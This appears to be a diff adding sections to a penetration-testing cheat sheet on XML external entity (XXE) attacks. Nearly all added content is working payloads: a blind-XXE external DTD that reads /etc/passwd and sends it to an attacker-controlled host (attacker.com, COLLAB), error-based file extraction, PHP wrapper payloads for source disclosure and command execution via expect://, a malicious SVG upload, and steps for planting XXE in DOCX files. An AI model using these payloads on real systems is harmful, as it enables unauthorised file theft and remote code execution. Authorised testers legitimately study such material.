@@ -306,3 +306,81 @@ cat modified_saml.xml | python3 -c "import sys,zlib,base64; print(base64.b64enco
 8. [ ] Test SVG/DOCX upload with embedded XXE entities
 9. [ ] Test SAML endpoints (decode → inject → re-encode SAMLRequest)
 10. [ ] Verify Spring Boot content negotiation on all API endpoints
+
+---
+
+## Parameter Entity Exploitation (Blind XXE)
+
+When direct entity reflection is blocked, use parameter entities with external DTD:
+
+### External DTD File (host on attacker server)
+```xml
+<!-- evil.dtd -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?d=%file;'>">
+%eval;
+%exfil;
+```
+
+### Payload
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<foo>bar</foo>
+```
+
+### Error-Based Extraction (no OOB needed)
+```xml
+<!-- evil.dtd -->
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+File content appears in the error message path.
+
+---
+
+## PHP Wrapper Exploitation
+
+### PHP filter (base64 encode source code)
+```xml
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
+```
+
+### PHP expect (RCE if expect:// enabled)
+```xml
+<!ENTITY xxe SYSTEM "expect://whoami">
+```
+
+### PHP input (POST body as entity content)
+```xml
+<!ENTITY xxe SYSTEM "php://input">
+<!-- POST body contains the data to inject -->
+```
+
+---
+
+## XXE via File Upload
+
+### SVG with XXE
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <text x="0" y="20">&xxe;</text>
+</svg>
+```
+
+### DOCX/XLSX (modify embedded XML)
+```bash
+unzip document.docx -d extracted/
+# Edit extracted/word/document.xml or [Content_Types].xml
+# Inject XXE entity, repack
+zip -r evil.docx extracted/
+```
